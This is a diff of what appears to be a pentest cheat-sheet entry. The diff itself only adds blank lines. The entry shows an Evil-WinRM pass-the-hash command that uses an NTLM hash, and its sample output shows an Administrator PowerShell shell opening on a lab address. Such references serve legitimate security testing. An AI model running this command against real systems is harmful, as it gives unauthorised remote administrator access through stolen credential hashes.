@@ -7,9 +7,12 @@ data: evil-winrm.rb -i $_TARGET -u $_USER -H $_NTLM
 output: 'root@kali:~/Documents/evil-winrm# ./evil-winrm.rb -i 10.10.10.10 -u Administrator
   -H ''FD030F3D045072C0508748D1C953862B''
 
+
   Evil-WinRM shell v2.3
 
+
   Info: Establishing connection to remote endpoint
+
 
   *Evil-WinRM* PS C:\Users\Administrator\Documents>'
 created_at: '2020-03-16T02:05:05.221748+00:00'
@@ -33,3 +36,5 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
+
+
